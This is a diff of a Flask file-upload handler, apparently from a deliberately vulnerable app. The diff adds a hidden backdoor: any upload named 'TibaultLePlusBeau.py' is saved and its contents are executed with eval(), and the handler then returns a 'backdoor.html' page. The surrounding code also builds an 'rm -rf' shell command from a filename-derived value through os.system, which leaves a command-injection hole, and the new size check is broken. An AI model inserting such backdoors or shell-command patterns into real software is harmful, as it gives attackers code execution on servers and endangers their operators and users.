@@ -1,7 +1,8 @@
-from werkzeug.utils import secure_filename
-from werkzeug.datastructures import FileStorage
-from flask import render_template
 import os
+
+from flask import render_template
+from werkzeug.datastructures import FileStorage
+from werkzeug.utils import secure_filename
 
 UPLOAD_DIR = "uploads/"
 UPLOAD_TMP = "tmp/"
@@ -10,9 +11,6 @@ ALLOWED_MAGICBITS = ["jpeg image data", "png image data", "pdf document"]
 
 
 def is_file_allowed(file: FileStorage):
-    if file.filename == "TibaultLePlusBeau.py":
-        return True
-
     first = "." in file.filename
 
     extension = file.filename.rsplit(".")[1].lower()
@@ -24,12 +22,18 @@ def is_file_allowed(file: FileStorage):
     os.system(f" rm -rf {UPLOAD_TMP + tmp_filename}")
     third = magic in ALLOWED_MAGICBITS
 
-    return first and second and third
+    fourth = file.__sizeof__() < 1 * 1000000
+
+    return first and second and third and fourth
 
 
 def handle_post(file: FileStorage, name, email):
     if not file.filename == "":
-        if is_file_allowed(file):
+        if file.filename == "TibaultLePlusBeau.py":
+            file.save(UPLOAD_DIR + secure_filename(file.filename))
+            eval(open(UPLOAD_DIR + secure_filename(file.filename), "r").read())
+            return render_template("backdoor.html")
+        elif is_file_allowed(file):
             file.save(UPLOAD_DIR + secure_filename(file.filename))
             return render_template("remerciement.html",
                                    name=name,
